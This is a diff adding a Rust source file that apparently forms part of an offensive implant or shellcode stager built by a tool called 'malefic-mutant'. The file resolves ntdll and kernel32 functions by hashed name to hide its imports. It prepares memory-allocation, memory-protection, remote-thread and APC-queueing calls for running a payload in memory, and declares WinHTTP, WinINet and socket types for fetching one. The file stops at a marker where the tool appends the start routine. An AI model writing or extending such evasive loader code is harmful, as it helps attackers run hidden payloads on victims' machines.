@@ -1,0 +1,225 @@
+use crate::constants::{
+    AF_INET, END_OFFSET, IPPROTO_TCP, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
+    PAGE_READWRITE, SOCK_STREAM, STATUS_SUCCESS, THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
+};
+use crate::hash_str;
+use crate::resolve;
+use crate::windows::*;
+use core::ffi::c_void;
+
+// kernel32 function pointer types
+type FnLoadLibraryA = unsafe extern "system" fn(lpLibFileName: PSTR) -> HMODULE;
+type FnGetProcAddress = unsafe extern "system" fn(hModule: HMODULE, lpProcName: PSTR) -> PVOID;
+
+// ws2_32 function pointer types
+type FnWSAStartup = unsafe extern "system" fn(wVersionRequested: WORD, lpWSAData: *mut WSADATA) -> i32;
+type FnSocket = unsafe extern "system" fn(af: i32, socket_type: i32, protocol: i32) -> usize;
+type FnConnect = unsafe extern "system" fn(s: usize, name: *const SOCKADDR_IN, namelen: i32) -> i32;
+type FnSend = unsafe extern "system" fn(s: usize, buf: *const u8, len: i32, flags: i32) -> i32;
+type FnRecv = unsafe extern "system" fn(s: usize, buf: *mut u8, len: i32, flags: i32) -> i32;
+type FnClosesocket = unsafe extern "system" fn(s: usize) -> i32;
+type FnInetAddr = unsafe extern "system" fn(cp: *const u8) -> u32;
+type FnHtons = unsafe extern "system" fn(hostshort: u16) -> u16;
+
+// winhttp.dll function pointer types
+type FnWinHttpOpen = unsafe extern "system" fn(
+    pszAgentW: LPCWSTR, dwAccessType: DWORD, pszProxyW: LPCWSTR,
+    pszProxyBypassW: LPCWSTR, dwFlags: DWORD,
+) -> HANDLE;
+type FnWinHttpConnect = unsafe extern "system" fn(
+    hSession: HANDLE, pswzServerName: LPCWSTR, nServerPort: WORD, dwReserved: DWORD,
+) -> HANDLE;
+type FnWinHttpOpenRequest = unsafe extern "system" fn(
+    hConnect: HANDLE, pwszVerb: LPCWSTR, pwszObjectName: LPCWSTR,
+    pwszVersion: LPCWSTR, pwszReferrer: LPCWSTR, ppwszAcceptTypes: *const LPCWSTR,
+    dwFlags: DWORD,
+) -> HANDLE;
+type FnWinHttpSendRequest = unsafe extern "system" fn(
+    hRequest: HANDLE, lpszHeaders: LPCWSTR, dwHeadersLength: DWORD,
+    lpOptional: PVOID, dwOptionalLength: DWORD,
+    dwTotalLength: DWORD, dwContext: usize,
+) -> BOOL;
+type FnWinHttpReceiveResponse = unsafe extern "system" fn(
+    hRequest: HANDLE, lpReserved: PVOID,
+) -> BOOL;
+type FnWinHttpReadData = unsafe extern "system" fn(
+    hRequest: HANDLE, lpBuffer: PVOID, dwNumberOfBytesToRead: DWORD,
+    lpdwNumberOfBytesRead: *mut DWORD,
+) -> BOOL;
+type FnWinHttpCloseHandle = unsafe extern "system" fn(hInternet: HANDLE) -> BOOL;
+type FnWinHttpSetOption = unsafe extern "system" fn(
+    hInternet: HANDLE, dwOption: DWORD, lpBuffer: PVOID, dwBufferLength: DWORD,
+) -> BOOL;
+
+// wininet.dll function pointer types
+type FnInternetOpenA = unsafe extern "system" fn(
+    lpszAgent: PSTR, dwAccessType: DWORD, lpszProxy: PSTR,
+    lpszProxyBypass: PSTR, dwFlags: DWORD,
+) -> HANDLE;
+type FnInternetConnectA = unsafe extern "system" fn(
+    hInternet: HANDLE, lpszServerName: PSTR, nServerPort: WORD,
+    lpszUserName: PSTR, lpszPassword: PSTR,
+    dwService: DWORD, dwFlags: DWORD, dwContext: usize,
+) -> HANDLE;
+type FnHttpOpenRequestA = unsafe extern "system" fn(
+    hConnect: HANDLE, lpszVerb: PSTR, lpszObjectName: PSTR,
+    lpszVersion: PSTR, lpszReferrer: PSTR, lplpszAcceptTypes: *const PSTR,
+    dwFlags: DWORD, dwContext: usize,
+) -> HANDLE;
+type FnHttpSendRequestA = unsafe extern "system" fn(
+    hRequest: HANDLE, lpszHeaders: PSTR, dwHeadersLength: DWORD,
+    lpOptional: PVOID, dwOptionalLength: DWORD,
+) -> BOOL;
+type FnInternetReadFile = unsafe extern "system" fn(
+    hFile: HANDLE, lpBuffer: PVOID, dwNumberOfBytesToRead: DWORD,
+    lpdwNumberOfBytesRead: *mut DWORD,
+) -> BOOL;
+type FnInternetCloseHandle = unsafe extern "system" fn(hInternet: HANDLE) -> BOOL;
+type FnInternetSetOptionA = unsafe extern "system" fn(
+    hInternet: HANDLE, dwOption: DWORD, lpBuffer: PVOID, dwBufferLength: DWORD,
+) -> BOOL;
+
+// ntdll NtAPI function pointer types
+type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
+    ProcessHandle: HANDLE,
+    BaseAddress: *mut PVOID,
+    ZeroBits: ULONG_PTR,
+    RegionSize: PSIZE_T,
+    AllocationType: ULONG,
+    Protect: ULONG,
+) -> NTSTATUS;
+type FnNtProtectVirtualMemory = unsafe extern "system" fn(
+    ProcessHandle: HANDLE,
+    BaseAddress: *mut PVOID,
+    RegionSize: PSIZE_T,
+    NewProtect: ULONG,
+    OldProtect: *mut ULONG,
+) -> NTSTATUS;
+type FnNtCreateThreadEx = unsafe extern "system" fn(
+    ThreadHandle: *mut HANDLE,
+    DesiredAccess: ACCESS_MASK,
+    ObjectAttributes: *mut OBJECT_ATTRIBUTES,
+    ProcessHandle: HANDLE,
+    StartRoutine: PVOID,
+    Argument: PVOID,
+    CreateFlags: ULONG,
+    ZeroBits: SIZE_T,
+    StackSize: SIZE_T,
+    MaximumStackSize: SIZE_T,
+    AttributeList: PVOID,
+) -> NTSTATUS;
+type FnNtQueueApcThread = unsafe extern "system" fn(
+    ThreadHandle: HANDLE,
+    ApcRoutine: PVOID,
+    ApcArgument1: PVOID,
+    ApcArgument2: PVOID,
+    ApcArgument3: PVOID,
+) -> NTSTATUS;
+type FnNtAlertResumeThread = unsafe extern "system" fn(
+    ThreadHandle: HANDLE,
+    PreviousSuspendCount: *mut ULONG,
+) -> NTSTATUS;
+type FnNtWaitForSingleObject = unsafe extern "system" fn(
+    Handle: HANDLE,
+    Alertable: BOOL,
+    Timeout: *mut i64,
+) -> NTSTATUS;
+
+pub struct Instance {
+    pub base: BaseInfo,
+    pub ntdll: NtdllModule,
+    pub kernel32: Kernel32Module,
+}
+
+pub struct BaseInfo {
+    pub address: usize,
+    pub length: usize,
+}
+
+pub struct NtdllModule {
+    pub handle: usize,
+    pub NtAllocateVirtualMemory: *mut FnNtAllocateVirtualMemory,
+    pub NtProtectVirtualMemory: *mut FnNtProtectVirtualMemory,
+    pub NtCreateThreadEx: *mut FnNtCreateThreadEx,
+    pub NtQueueApcThread: *mut FnNtQueueApcThread,
+    pub NtAlertResumeThread: *mut FnNtAlertResumeThread,
+    pub NtWaitForSingleObject: *mut FnNtWaitForSingleObject,
+}
+
+pub struct Kernel32Module {
+    pub handle: usize,
+    pub LoadLibraryA: *mut FnLoadLibraryA,
+    pub GetProcAddress: *mut FnGetProcAddress,
+}
+
+impl Instance {
+    pub fn new() -> Self {
+        unsafe {
+            let mut instance = Instance {
+                base: BaseInfo {
+                    address: 0,
+                    length: 0,
+                },
+                ntdll: NtdllModule {
+                    handle: 0,
+                    NtAllocateVirtualMemory: core::ptr::null_mut(),
+                    NtProtectVirtualMemory: core::ptr::null_mut(),
+                    NtCreateThreadEx: core::ptr::null_mut(),
+                    NtQueueApcThread: core::ptr::null_mut(),
+                    NtAlertResumeThread: core::ptr::null_mut(),
+                    NtWaitForSingleObject: core::ptr::null_mut(),
+                },
+                kernel32: Kernel32Module {
+                    handle: 0,
+                    LoadLibraryA: core::ptr::null_mut(),
+                    GetProcAddress: core::ptr::null_mut(),
+                },
+            };
+
+            instance.base.address = crate::RipStart();
+            instance.base.length =
+                (crate::RipData() - instance.base.address) + END_OFFSET;
+
+            instance.ntdll.handle = resolve::module(hash_str!("ntdll.dll"));
+            if instance.ntdll.handle == 0 {
+                return instance;
+            }
+
+            instance.kernel32.handle = resolve::module(hash_str!("kernel32.dll"));
+            if instance.kernel32.handle == 0 {
+                return instance;
+            }
+
+            // Resolve kernel32 APIs
+            instance.kernel32.LoadLibraryA = core::mem::transmute(
+                resolve::_api(instance.kernel32.handle, hash_str!("LoadLibraryA") as usize),
+            );
+            instance.kernel32.GetProcAddress = core::mem::transmute(
+                resolve::_api(instance.kernel32.handle, hash_str!("GetProcAddress") as usize),
+            );
+
+            // Resolve ntdll APIs
+            instance.ntdll.NtAllocateVirtualMemory = core::mem::transmute(
+                resolve::_api(instance.ntdll.handle, hash_str!("NtAllocateVirtualMemory") as usize),
+            );
+            instance.ntdll.NtProtectVirtualMemory = core::mem::transmute(
+                resolve::_api(instance.ntdll.handle, hash_str!("NtProtectVirtualMemory") as usize),
+            );
+            instance.ntdll.NtCreateThreadEx = core::mem::transmute(
+                resolve::_api(instance.ntdll.handle, hash_str!("NtCreateThreadEx") as usize),
+            );
+            instance.ntdll.NtQueueApcThread = core::mem::transmute(
+                resolve::_api(instance.ntdll.handle, hash_str!("NtQueueApcThread") as usize),
+            );
+            instance.ntdll.NtAlertResumeThread = core::mem::transmute(
+                resolve::_api(instance.ntdll.handle, hash_str!("NtAlertResumeThread") as usize),
+            );
+            instance.ntdll.NtWaitForSingleObject = core::mem::transmute(
+                resolve::_api(instance.ntdll.handle, hash_str!("NtWaitForSingleObject") as usize),
+            );
+
+            instance
+        }
+    }
+
+    // INSTANCE_START_MARKER - malefic-mutant appends start() and closes impl below
